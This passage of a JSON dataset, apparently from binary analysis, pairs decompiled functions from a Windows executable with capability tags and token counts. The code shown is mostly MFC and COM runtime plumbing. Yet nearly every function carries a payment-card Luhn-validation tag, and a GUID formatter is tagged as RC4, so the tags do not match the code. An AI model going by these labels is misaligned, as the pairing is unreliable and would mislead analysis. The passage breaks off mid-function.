        "decompiled_code": "\nvoid __cdecl\nfcn.0042f731(uint arg_8h, uint arg_ch, uint arg_10h, uint arg_14h, uint arg_18h, uint arg_1ch, uint arg_20h, \n            uint arg_24h, uint arg_28h)\n\n{\n    uint uVar1;\n    \n    uVar1 = fcn.0045cd6d(arg_8h, arg_ch, arg_10h, arg_14h, arg_18h, arg_1ch, arg_20h, arg_24h, arg_28h);\n    fcn.0040e7f0(uVar1);\n    return;\n}\n",
        "token_count": 147
    },
    "0042f75f": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0042f75f(uint arg_8h, uint arg_ch, uint arg_10h, uint arg_14h, uint arg_18h, uint arg_1ch)\n\n{\n    uint uVar1;\n    \n    uVar1 = fcn.0045cf8e(arg_8h, arg_ch, arg_10h, arg_14h, arg_18h, arg_1ch);\n    fcn.0040e7f0(uVar1);\n    return;\n}\n",
        "token_count": 113
    },
    "00430595": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nint32_t fcn.00430595(void)\n\n{\n    code *pcVar1;\n    int32_t iVar2;\n    uint uStack12;\n    \n    iVar2 = fcn.0043102b(0x430439);\n    if (iVar2 == 0) {\n        uStack12 = 0x4a8690;\n        fcn.00456b8d(&uStack12, 0x49ed44);\n        pcVar1 = swi(3);\n        iVar2 = (*pcVar1)();\n        return iVar2;\n    }\n    return iVar2 + 4;\n}\n",
        "token_count": 130
    },
    "004305b1": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_4h\n// WARNING: Variable defined which should be unmapped: var_10h\n\nvoid __cdecl fcn.004305b1(uint arg_8h, uint arg_ch, uint arg_10h)\n\n{\n    code *pcVar1;\n    uint32_t uVar2;\n    code *pcVar3;\n    code **extraout_ECX;\n    int32_t unaff_EBP;\n    uint var_10h;\n    uint var_4h;\n    \n    fcn.00458e45(4);\n    *(unaff_EBP + -0x10) = extraout_ECX;\n    fcn.00426a40(0, *(unaff_EBP + 0x10));\n    *(unaff_EBP + -4) = 0;\n    *extraout_ECX = vtable.CColorDialog.0;\n    fcn.00459330(extraout_ECX + 0x1d, 0, 0x24);\n    extraout_ECX[0x15] = 0x7007;\n    extraout_ECX[0x1d] = 0x24;\n    pcVar3 = fcn.00430595();\n    pcVar1 = *(unaff_EBP + 8);\n    extraout_ECX[0x21] = pcVar3;\n    uVar2 = *(unaff_EBP + 0xc);\n    extraout_ECX[0x22] = uVar2 | 0x10;\n    extraout_ECX[0x24] = fcn.0044440b;\n    extraout_ECX[0x20] = pcVar1;\n    if (pcVar1 != NULL) {\n        extraout_ECX[0x22] = uVar2 | 0x11;\n    }\n    fcn.00458f1d();\n    return;\n}\n",
        "token_count": 410
    },
    "00430d5c": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nint32_t fcn.00430d5c(int32_t *param_1)\n\n{\n    int32_t iVar1;\n    uint unaff_retaddr;\n    \n    iVar1 = fcn.00430b71(param_1);\n    *param_1 = iVar1;\n    if (iVar1 == 0) {\n        iVar1 = fcn.00430c1f(unaff_retaddr);\n        *param_1 = iVar1;\n        iVar1 = (-(iVar1 != 0) & 0x7fffbffe) + 0x80004002;\n    }\n    else {\n        fcn.00430cd6();\n        iVar1 = 0;\n    }\n    return iVar1;\n}\n",
        "token_count": 154
    },
    "0043132f": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_4h\n// WARNING: Variable defined which should be unmapped: var_18h\n// WARNING: Variable defined which should be unmapped: lpCriticalSection\n\nvoid __cdecl fcn.0043132f(uint arg_8h, uint arg_ch)\n\n{\n    code **ppcVar1;\n    uint uVar2;\n    code *pcVar3;\n    uint *extraout_ECX;\n    int32_t iVar4;\n    int32_t unaff_EBP;\n    uint var_18h;\n    uint lpCriticalSection;\n    uint *puVar5;\n    uint var_4h;\n    \n    fcn.00458e78(0x10);\n    *(unaff_EBP + -0x18) = extraout_ECX;\n    puVar5 = extraout_ECX + 7;\n    *(unaff_EBP + -0x14) = puVar5;\n    (*_sym.imp.KERNEL32.dll_EnterCriticalSection)(puVar5);\n    if ((*(unaff_EBP + 8) < 1) || (extraout_ECX[3] <= *(unaff_EBP + 8))) goto code_r0x00431456;\n    ppcVar1 = (*_sym.imp.KERNEL32.dll_TlsGetValue)(*extraout_ECX);\n    if (ppcVar1 == NULL) {\n        *(unaff_EBP + -4) = 0;\n        ppcVar1 = fcn.00430f5c(0x10);\n        if (ppcVar1 == NULL) {\n            ppcVar1 = NULL;\n        }\n        else {\n            *ppcVar1 = vtable.CThreadData.0;\n        }\n        *(unaff_EBP + -4) = 0xffffffff;\n        ppcVar1[2] = NULL;\n        ppcVar1[3] = NULL;\n        fcn.004310d8(ppcVar1);\ncode_r0x00431386:\n        if (ppcVar1[3] == NULL) {\n            uVar2 = fcn.004161d0(extraout_ECX[3], 4);\n            pcVar3 = (*_sym.imp.KERNEL32.dll_LocalAlloc)(0, uVar2);\n        }\n        else {\n            uVar2 = fcn.004161d0(extraout_ECX[3], 4, 2);\n            pcVar3 = (*_sym.imp.KERNEL32.dll_LocalReAlloc)(ppcVar1[3], uVar2);\n        }\n        if (pcVar3 == NULL) {\n            (*_sym.imp.KERNEL32.dll_LeaveCriticalSection)(*(unaff_EBP + -0x14));\n            pcVar3 = fcn.00418fe6();\n        }\n        ppcVar1[3] = pcVar3;\n        fcn.00459330(pcVar3 + ppcVar1[2] * 4, 0, (extraout_ECX[3] - ppcVar1[2]) * 4);\n        ppcVar1[2] = extraout_ECX[3];\n        (*_sym.imp.KERNEL32.dll_TlsSetValue)(*extraout_ECX, ppcVar1);\n        iVar4 = *(unaff_EBP + 8);\n    }\n    else {\n        iVar4 = *(unaff_EBP + 8);\n        if ((ppcVar1[2] <= iVar4) && (*(unaff_EBP + 0xc) != 0)) goto code_r0x00431386;\n    }\n    if ((ppcVar1[3] != NULL) && (iVar4 < ppcVar1[2])) {\n        *(ppcVar1[3] + iVar4 * 4) = *(unaff_EBP + 0xc);\n    }\n    puVar5 = *(unaff_EBP + -0x14);\ncode_r0x00431456:\n    (*_sym.imp.KERNEL32.dll_LeaveCriticalSection)(puVar5);\n    fcn.00458f1d();\n    return;\n}\n",
        "token_count": 872
    },
    "0043194f": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint * __cdecl fcn.0043194f(int32_t arg_8h)\n\n{\n    int32_t iVar1;\n    uint *puVar2;\n    int32_t in_ECX;\n    uint var_4h;\n    \n    iVar1 = arg_8h;\n    puVar2 = fcn.00431765(arg_8h, &arg_8h, &var_4h);\n    if (puVar2 == NULL) {\n        if (*(in_ECX + 4) == 0) {\n            fcn.004316c7(*(in_ECX + 8), 1);\n        }\n        puVar2 = fcn.00431901();\n        puVar2[1] = iVar1;\n        *puVar2 = *(arg_8h * 4 + *(in_ECX + 4));\n        *(arg_8h * 4 + *(in_ECX + 4)) = puVar2;\n    }\n    return puVar2 + 2;\n}\n",
        "token_count": 215
    },
    "00431d30": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00431d30(int32_t arg_8h, int32_t arg_ch)\n\n{\n    uint32_t uVar1;\n    uint32_t uVar2;\n    int32_t iVar3;\n    uint unaff_EBX;\n    uchar lpString1;\n    uint var_103h;\n    uint32_t var_4h;\n    \n    var_4h = *0x4a9ec8 ^ &stack0xfffffffc;\n    if (arg_8h != 0) goto code_r0x00431d55;\n    do {\n        fcn.0041901a();\ncode_r0x00431d55:\n    } while (arg_ch == 0);\n    uVar1 = (*_sym.imp.KERNEL32.dll_lstrlenA)(arg_ch);\n    lpString1 = 0;\n    fcn.00459330(&var_103h, 0, 0xff);\n    if (uVar1 < 0x101) {\n        uVar2 = (*_sym.imp.USER32.dll_GetWindowTextA)(arg_8h, &lpString1, 0x100);\n        if (uVar2 == uVar1) {\n            iVar3 = (*_sym.imp.KERNEL32.dll_lstrcmpA)(&lpString1, arg_ch);\n            if (iVar3 == 0) goto code_r0x00431db5;\n        }\n    }\n    (*_sym.imp.USER32.dll_SetWindowTextA)(arg_8h, arg_ch);\ncode_r0x00431db5:\n    fcn.004566a8(unaff_EBX);\n    return;\n}\n",
        "token_count": 349
    },
    "00431e68": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00431e68(uint arg_8h, uint *arg_ch)\n\n{\n    int32_t iVar1;\n    uchar *puVar2;\n    uint uVar3;\n    uint *arg_8h_00;\n    uint var_104h;\n    uint32_t var_4h;\n    \n    var_4h = *0x4a9ec8 ^ &stack0xfffffffc;\n    if (arg_ch == NULL) {\n        fcn.0041901a();\n    }\n    arg_8h_00 = &var_104h;\n    iVar1 = fcn.00424172(arg_8h, arg_8h_00, 0x100);\n    if (iVar1 != 0) {\n        puVar2 = fcn.0045c352(&var_104h, 10);\n        if (puVar2 != NULL) {\n            uVar3 = fcn.00456bfd(puVar2 + 1);\n            *arg_ch = uVar3;\n            uVar3 = (*_sym.imp.KERNEL32.dll_MulDiv)(uVar3, *0x4ad214, 0x48);\n            *arg_ch = uVar3;\n            *puVar2 = 0;\n        }\n        uVar3 = fcn.00458fdb(arg_ch + 7, 0x20, &var_104h, 0xffffffff);\n        fcn.0040e7f0(uVar3);\n    }\n    fcn.004566a8(arg_8h_00);\n    return;\n}\n",
        "token_count": 341
    },
    "00432168": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.00432168(uint32_t param_1)\n\n{\n    if (0x10 < param_1) {\n        param_1 = fcn.0041901a();\n    }\n    (*_sym.imp.KERNEL32.dll_LeaveCriticalSection)(param_1 * 0x18 + 0x4ad290);\n    return;\n}\n",
        "token_count": 76
    },
    "00432198": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.00432198(void)\n\n{\n    int32_t iVar1;\n    \n    iVar1 = fcn.0042b7b9();\n    (*_sym.imp.KERNEL32.dll_InterlockedIncrement)(iVar1 + 0x2c);\n    return;\n}\n",
        "token_count": 59
    },
    "0043376f": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.0043376f(uint param_1)\n\n{\n    fcn.00459330(param_1, 0, 0x10);\n    return;\n}\n",
        "token_count": 38
    },
    "00433cec": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nvoid __cdecl fcn.00433cec(uint arg_8h, uint arg_ch, uint arg_10h, uint arg_14h, uint arg_18h, uint arg_1ch)\n\n{\n    int32_t iVar1;\n    int32_t in_ECX;\n    uint var_10h;\n    uint var_ah;\n    ushort var_6h;\n    ushort var_4h;\n    \n    fcn.00459330(&var_10h, 0, 0x10);\n    var_10h._0_2_ = arg_8h;\n    var_10h._2_2_ = arg_ch;\n    var_ah._0_2_ = arg_10h;\n    var_ah._2_2_ = arg_14h;\n    var_6h = arg_18h;\n    var_4h = arg_1ch;\n    iVar1 = fcn.0042d166(&var_10h, in_ECX);\n    *(in_ECX + 8) = iVar1 == 0;\n    return;\n}\n",
        "token_count": 242
    },
    "00433daf": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00433daf(uint psa, uint arg_ch, uint arg_10h)\n\n{\n    uint uVar1;\n    uint var_4h;\n    \n    uVar1 = (*_sym.imp.OLEAUT32.dll_SafeArrayUnaccessData)(psa, &var_4h);\n    fcn.004331ab(uVar1);\n    fcn.00417b17(var_4h, arg_10h, arg_ch, arg_10h);\n    uVar1 = (*_sym.imp.OLEAUT32.dll_SafeArrayGetElement)(psa);\n    fcn.004331ab(uVar1);\n    return;\n}\n",
        "token_count": 144
    },
    "00434740": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_4h\n\nvoid __cdecl fcn.00434740(uint arg_8h, uint arg_ch)\n\n{\n    uint arg_8h_00;\n    code *pcVar1;\n    uint uVar2;\n    int32_t iVar3;\n    int32_t unaff_EBP;\n    uint var_4h;\n    \n    fcn.00458e45(0);\n    pcVar1 = _sym.imp.OLEAUT32.dll_VariantInit;\n    arg_8h_00 = *(unaff_EBP + 0xc);\n    *(unaff_EBP + -4) = 0;\n    uVar2 = (*pcVar1)(arg_8h_00);\n    fcn.004329cd(uVar2);\n    iVar3 = (*pcVar1)(arg_8h_00);\n    if (iVar3 != 0) {\n        iVar3 = (*pcVar1)(arg_8h_00);\n        fcn.00432d0d(arg_8h_00, iVar3 * 2);\n    }\n    (*_sym.imp.OLEAUT32.dll_SysStringLen)(arg_8h_00);\n    fcn.00458f1d();\n    return;\n}\n",
        "token_count": 273
    },
    "004347ed": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __thiscall fcn.004347ed(uint32_t *param_1, int32_t *param_2, uint32_t *param_3)\n\n{\n    uint32_t uVar1;\n    uint32_t uVar2;\n    uint32_t uVar3;\n    int32_t iVar4;\n    \n    uVar1 = param_1[2];\n    iVar4 = 2;\n    param_2[1] = 0;\n    *param_2 = 0;\n    param_2[2] = 0;\n    if ((((uVar1 != 2) && (param_3[2] != 2)) && (iVar4 = 1,  uVar1 != 1)) && (param_3[2] != 1)) {\n        uVar3 = param_3[1] + param_1[1] + CARRY4(*param_3, *param_1);\n        uVar1 = param_1[1];\n        *param_2 = *param_3 + *param_1;\n        uVar2 = param_3[1];\n        param_2[1] = uVar3;\n        if (((uVar2 ^ uVar1) & 0x80000000) != 0) {\n            return;\n        }\n        if (((uVar3 ^ uVar1) & 0x80000000) == 0) {\n            return;\n        }\n    }\n    param_2[2] = iVar4;\n    return;\n}\n",
        "token_count": 325
    },
    "00434f5f": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_4h\n// WARNING: Variable defined which should be unmapped: var_30h\n// WARNING: Variable defined which should be unmapped: var_2ch\n// WARNING: Variable defined which should be unmapped: var_28h\n// WARNING: Variable defined which should be unmapped: var_24h\n// WARNING: Variable defined which should be unmapped: var_20h\n// WARNING: Variable defined which should be unmapped: var_38h\n\nvoid __cdecl fcn.00434f5f(uint arg_8h, uint arg_ch)\n\n{\n    uint *puVar1;\n    uint16_t uVar2;\n    uint *puVar3;\n    code **ppcVar4;\n    code *pcVar5;\n    uint uVar6;\n    int32_t iVar7;\n    int32_t unaff_EBP;\n    uint16_t *puVar8;\n    uint var_38h;\n    uint var_30h;\n    uint var_2ch;\n    uint var_28h;\n    uint var_24h;\n    uint var_20h;\n    uint var_4h;\n    \n    fcn.00458ee4(0x30);\n    puVar8 = *(unaff_EBP + 0xc);\n    uVar6 = *(unaff_EBP + 8);\n    uVar2 = *puVar8;\n    *(unaff_EBP + -0x28) = uVar6;\n    *(unaff_EBP + -0x30) = puVar8;\n    if (uVar2 != 0) {\n        (*_sym.imp.OLEAUT32.dll_VariantCopy)(puVar8);\n    }\n    fcn.00432a8d(puVar8);\n    if ((*puVar8 & 0x6000) != 0) goto code_r0x00435061;\n    // switch table (22 cases) at 0x43516f\n    switch(*puVar8) {\n    case 2:\n    case 0xb:\n    case 0x12:\n        fcn.00432a8d(puVar8 + 4);\n        break;\n    case 3:\n    case 10:\n        puVar8 = puVar8 + 4;\n        goto code_r0x00434fd0;\n    case 4:\n        fcn.00434657(puVar8 + 4);\n        break;\n    case 5:\n    case 7:\n        fcn.00434699(puVar8 + 4);\n        break;\n    case 6:\n        fcn.00432ad0(puVar8 + 4);\n        puVar8 = puVar8 + 6;\ncode_r0x00434fd0:\n        fcn.004346db(puVar8);\n        break;\n    case 8:\n        fcn.00432ad0(unaff_EBP + -0x28);\n        if (*(unaff_EBP + -0x28) == 0) {\n            *(puVar8 + 4) = 0;\n        }\n        else {\n            iVar7 = (*_sym.imp.OLEAUT32.dll_DllRegisterServer)(0, *(unaff_EBP + -0x28));\n            *(puVar8 + 4) = iVar7;\n            if (iVar7 == 0) {\n                iVar7 = fcn.00418fe6();\n            }\n            fcn.00429f7a(iVar7, *(unaff_EBP + -0x28));\n        }\n        break;\n    case 9:\n    case 0xd:\n        *(unaff_EBP + -0x2c) = 0;\n        fcn.0043acf0(uVar6);\n        fcn.00432ad0(unaff_EBP + -0x24);\n        fcn.00432a8d(unaff_EBP + -0x20);\n        fcn.00432a8d(unaff_EBP + -0x1e);\n        fcn.00429f7a(unaff_EBP + -0x1c, 8);\n        pcVar5 = _sym.imp.ole32.dll_CoCreateInstance;\n        uVar6 = 0x4965a4;\n        if (*puVar8 != 0xd) {\n            uVar6 = 0x496534;\n        }\n        puVar1 = puVar8 + 4;\n        iVar7 = (*_sym.imp.ole32.dll_CoCreateInstance)(unaff_EBP + -0x24, 0, 0x17, uVar6, puVar1);\n        if (iVar7 == -0x7ff8ffa9) {\n            uVar6 = 0x4965a4;\n            if (*puVar8 != 0xd) {\n                uVar6 = 0x496534;\n            }\n            iVar7 = (*pcVar5)(unaff_EBP + -0x24, 0, 7, uVar6, puVar1);\n        }\n        fcn.004331ab(iVar7);\n        puVar3 = *puVar1;\n        ppcVar4 = *puVar3;\n        *(unaff_EBP + -4) = 0;\n        iVar7 = (**ppcVar4)(puVar3, 0x496cb4, unaff_EBP + -0x2c);\n        if (iVar7 < 0) {\n            iVar7 = (****puVar1)(*puVar1, 0x496714, unaff_EBP + -0x2c);\n        }\n        fcn.004331ab(iVar7);\n        uVar6 = (**(**(unaff_EBP + -0x2c) + 0x14))(*(unaff_EBP + -0x2c), unaff_EBP + -0x38);\n        fcn.004331ab(uVar6);\n        iVar7 = **(unaff_EBP + -0x2c);\n        *(unaff_EBP + -4) = 0xffffffff;\n        (**(iVar7 + 8))(*(unaff_EBP + -0x2c));\n        break;\n    case 0x10:\n    case 0x11:\n        fcn.00432a06(puVar8 + 4);\n        break;\n    case 0x13:\n        fcn.00432ad0(puVar8 + 4);\n        break;\n    case 0x14:\n        fcn.0043460f(puVar8 + 4);\n        break;\n    case 0x15:\n        fcn.00432a45(puVar8 + 4);\n    }\ncode_r0x00435061:\n    fcn.00458f40();\n    return;\n}\n",
        "token_count": 1465
    },
    "0043552a": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint __cdecl fcn.0043552a(uint arg_8h, uint pcyOut, uint lcid)\n\n{\n    uint *puVar1;\n    int32_t arg_8h_00;\n    uint uVar2;\n    uint *in_ECX;\n    \n    puVar1 = fcn.00418c5b(arg_8h);\n    arg_8h_00 = (*_sym.imp.OLEAUT32.dll_VarCyFromDisp)(*puVar1, lcid, pcyOut);\n    fcn.004010d0();\n    uVar2 = 0;\n    if (arg_8h_00 < 0) {\n        if (arg_8h_00 == -0x7ffdfffb) {\n            in_ECX[1] = 0;\n        }\n        else {\n            if (arg_8h_00 != -0x7ffdfff6) {\n                if (arg_8h_00 == -0x7ff8fff2) {\n                    fcn.00418fe6();\n                }\n                uVar2 = fcn.00417c31(arg_8h_00);\n                goto code_r0x0043559b;\n            }\n            in_ECX[1] = 0x80000000;\n        }\n        *in_ECX = 0;\n        in_ECX[2] = 1;\n        uVar2 = 0;\n    }\n    else {\ncode_r0x0043559b:\n        in_ECX[2] = uVar2;\n        uVar2 = 1;\n    }\n    return uVar2;\n}\n",
        "token_count": 346
    },
    "0043637c": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __thiscall fcn.0043637c(int32_t param_1, uint param_2)\n\n{\n    uint uVar1;\n    \n    fcn.0045839d(*(param_1 + 0x54));\n    uVar1 = fcn.0045c8dc(param_2);\n    *(param_1 + 0x54) = uVar1;\n    fcn.0045839d(*(param_1 + 0x68));\n    uVar1 = fcn.0045c8dc(*(param_1 + 0x50));\n    *(param_1 + 0x68) = uVar1;\n    return;\n}\n",
        "token_count": 144
    },
    "004369bb": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.004369bb(uint param_1, uint param_2, uint param_3)\n\n{\n    uint uVar1;\n    \n    uVar1 = fcn.0045d49b(param_1, param_2, param_3);\n    fcn.0040e7f0(uVar1);\n    return;\n}\n",
        "token_count": 74
    },
    "0043731b": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nint32_t fcn.0043731b(uint32_t param_1)\n\n{\n    int32_t iVar1;\n    \n    if (param_1 < 0x16) {\n        iVar1 = param_1 + 0x40000;\n    }\n    else {\n        iVar1 = -1;\n    }\n    return iVar1;\n}\n",
        "token_count": 74
    },
    "00437a7c": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: phkResult\n\nvoid __cdecl fcn.00437a7c(uint arg_8h)\n\n{\n    int32_t arg_8h_00;\n    int32_t iVar1;\n    uchar *puVar2;\n    uint phkResult;\n    uint lpName;\n    uint32_t var_4h;\n    \n    var_4h = *0x4a9ec8 ^ &stack0xfffffffc;\n    arg_8h_00 = fcn.0045c8dc(arg_8h);\n    if (arg_8h_00 != 0) {\n        iVar1 = (*_sym.imp.KERNEL32.dll_lstrlenA)(arg_8h_00);\n        puVar2 = iVar1 + arg_8h_00;\n        while (puVar2 != NULL) {\n            *puVar2 = 0;\n            fcn.0045d862(arg_8h_00, puVar2);\n            iVar1 = (*_sym.imp.ADVAPI32.dll_RegOpenKeyA)(0x80000000, arg_8h_00, &phkResult);\n            if (iVar1 != 0) break;\n            iVar1 = (*_sym.imp.ADVAPI32.dll_RegEnumKeyA)(phkResult, 0, &lpName, 0x105);\n            (*_sym.imp.ADVAPI32.dll_RegCloseKey)(phkResult);\n            if (iVar1 == 0) break;\n            (*_sym.imp.ADVAPI32.dll_RegDeleteKeyA)(0x80000000, arg_8h_00);\n            puVar2 = fcn.00457c65(arg_8h_00, 0x5c);\n        }\n        fcn.0045839d(arg_8h_00);\n    }\n    fcn.004566a8(phkResult);\n    return;\n}\n",
        "token_count": 410
    },
    "00438007": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nint32_t __thiscall fcn.00438007(int32_t *param_1, uchar param_2, int32_t param_3)\n\n{\n    int32_t iVar1;\n    \n    if (((-1 < param_3) && (param_3 < *(*param_1 + -0xc))) &&\n       (iVar1 = fcn.0045c352(*param_1 + param_3, param_2),  iVar1 != 0)) {\n        return iVar1 - *param_1;\n    }\n    return -1;\n}\n",
        "token_count": 119
    },
    "004381cb": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint __cdecl fcn.004381cb(uint arg_8h, int32_t arg_ch)\n\n{\n    int32_t iVar1;\n    int32_t iVar2;\n    uint uVar3;\n    int32_t *in_ECX;\n    uint var_4h;\n    \n    if (arg_ch < 0) {\n        arg_ch = 0;\n    }\n    iVar1 = *in_ECX;\n    iVar2 = *(iVar1 + -0xc);\n    if (arg_ch < iVar2) {\n        uVar3 = fcn.004018a0();\n        fcn.004104f0((iVar1 - arg_ch) + iVar2, arg_ch, uVar3);\n    }\n    else {\n        fcn.00401920();\n    }\n    return arg_8h;\n}\n",
        "token_count": 172
    },
    "00439aa2": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.00439aa2(void)\n\n{\n    uint uVar1;\n    uint unaff_retaddr;\n    \n    uVar1 = fcn.00401940(0x104);\n    fcn.00459330(uVar1, 0, 0x104);\n    fcn.00417b55(uVar1, 0x104, unaff_retaddr, 0xffffffff);\n    (*_sym.imp.SHLWAPI.dll_PathStripToRootA)(uVar1);\n    fcn.00410110(0xffffffff);\n    return;\n}\n",
        "token_count": 122
    },
    "0043a066": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "encrypt data using RC4 KSA/41e5dbd1fcbf406ebac8c999dfc1b5ff"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0043a066(uint arg_8h, uint *arg_ch)\n\n{\n    uint unaff_ESI;\n    uint var_108h;\n    uint var_104h;\n    uint32_t var_4h;\n    \n    var_4h = *0x4a9ec8 ^ &stack0xfffffffc;\n    fcn.004595a7(&var_104h, 0x100, \"{%08X-%04X-%04X-%02X%02X-%02X%02X%02X%02X%02X%02X}\", *arg_ch, *(arg_ch + 1), \n                 *(arg_ch + 6), *(arg_ch + 2), *(arg_ch + 9), *(arg_ch + 10), *(arg_ch + 0xb), *(arg_ch + 3), \n                 *(arg_ch + 0xd), *(arg_ch + 0xe), *(arg_ch + 0xf));\n    fcn.00402f40(&var_104h);\n    fcn.004566a8(unaff_ESI);\n    return;\n}\n",
        "token_count": 242
    },
    "0043a16a": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_4h\n// WARNING: Variable defined which should be unmapped: var_10h\n\nvoid __cdecl fcn.0043a16a(uint arg_8h, uint arg_ch, uint arg_10h)\n\n{\n    uint *puVar1;\n    uint uVar2;\n    int32_t iVar3;\n    code *pcVar4;\n    int32_t unaff_EBP;\n    uint var_10h;\n    uint var_4h;\n    \n    fcn.00458e45(4);\n    uVar2 = *(unaff_EBP + 8);\n    puVar1 = *(unaff_EBP + 0x10);\n    *puVar1 = 0;\n    fcn.0043a066(unaff_EBP + -0x10, uVar2);\n    *(unaff_EBP + -4) = 0;\n    uVar2 = fcn.00423280();\n    fcn.00401680(uVar2);\n    *(unaff_EBP + -4) = 1;\n    iVar3 = fcn.004399f2(*(unaff_EBP + -0x10), unaff_EBP + 0x10);\n    if (iVar3 == 0) {\n        fcn.004010d0();\n        fcn.004010d0();\n    }\n    else {\n        iVar3 = fcn.0041ccf5(*(unaff_EBP + 0x10));\n        if ((iVar3 != 0) &&\n           (pcVar4 = (*_sym.imp.KERNEL32.dll_GetProcAddress)(iVar3, \"DllGetClassObject\"),  pcVar4 != NULL)) {\n            (*pcVar4)(*(unaff_EBP + 8), *(unaff_EBP + 0xc), puVar1);\n        }\n        fcn.004010d0();\n        fcn.004010d0();\n    }\n    fcn.00458f1d();\n    return;\n}\n",
        "token_count": 432
    },
    "0043a463": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.0043a463(int32_t param_1)\n\n{\n    int16_t iVar1;\n    int16_t *piVar2;\n    \n    if (*(param_1 + 2) == -1) {\n        piVar2 = param_1 + 0x1a;\n    }\n    else {\n        piVar2 = param_1 + 0x12;\n    }\n    if (*piVar2 == -1) {\n        piVar2 = piVar2 + 2;\n    }\n    else {\n        do {\n            iVar1 = *piVar2;\n            piVar2 = piVar2 + 1;\n        } while (iVar1 != 0);\n    }\n    if (*piVar2 == -1) {\n        piVar2 = piVar2 + 2;\n    }\n    else {\n        do {\n            iVar1 = *piVar2;\n            piVar2 = piVar2 + 1;\n        } while (iVar1 != 0);\n    }\n    do {\n        iVar1 = *piVar2;\n        piVar2 = piVar2 + 1;\n    } while (iVar1 != 0);\n    return;\n}\n",
        "token_count": 251
    },
    "0043b4f1": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_4h\n\nvoid __cdecl fcn.0043b4f1(uint arg_8h)\n\n{\n    int32_t iVar1;\n    uint uVar2;\n    int32_t *piVar3;\n    int32_t *piVar4;\n    uint32_t uVar5;\n    int32_t *extraout_ECX;\n    int32_t unaff_EBP;\n    uint var_14h;\n    uint var_4h;\n    \n    fcn.00458e78(0xc);\n    *(unaff_EBP + -0x14) = extraout_ECX;\n    piVar3 = extraout_ECX + 0x13;\n    if (*piVar3 == 0) {\n        iVar1 = (**(*extraout_ECX + 0x124))(piVar3);\n        if ((iVar1 != 0) && (*piVar3 == 0)) {\n            *(unaff_EBP + -4) = 0;\n            iVar1 = fcn.0042b7b9();\n            iVar1 = (**(**(iVar1 + 0x3c) + 8))(extraout_ECX);\n            *(unaff_EBP + -4) = 0xffffffff;\n            *piVar3 = iVar1;\n        }\n        if (*(unaff_EBP + 8) == 0) {\n            iVar1 = 